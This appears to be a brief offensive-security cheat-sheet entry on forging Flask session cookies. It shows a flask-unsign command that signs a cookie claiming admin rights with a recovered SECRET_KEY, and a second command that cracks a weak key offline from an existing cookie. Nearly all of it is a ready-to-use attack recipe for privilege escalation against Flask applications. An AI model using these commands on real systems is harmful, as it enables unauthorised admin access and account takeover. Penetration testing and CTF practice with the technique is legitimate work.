# Flask Secret Key Cookie Forgery

If you recover a Flask app's `SECRET_KEY` (leaked config, container image, source dump), you can forge any session cookie directly — no need to find an auth bypass.

```bash
flask-unsign --sign --cookie '{"admin": true, "user": "<username>"}' --secret '<SECRET_KEY>'
# set the resulting value as the session cookie
```

`flask-unsign --unsign --cookie '<existing-cookie>'` can also crack a weak `SECRET_KEY` offline if you only have a cookie, not the key.
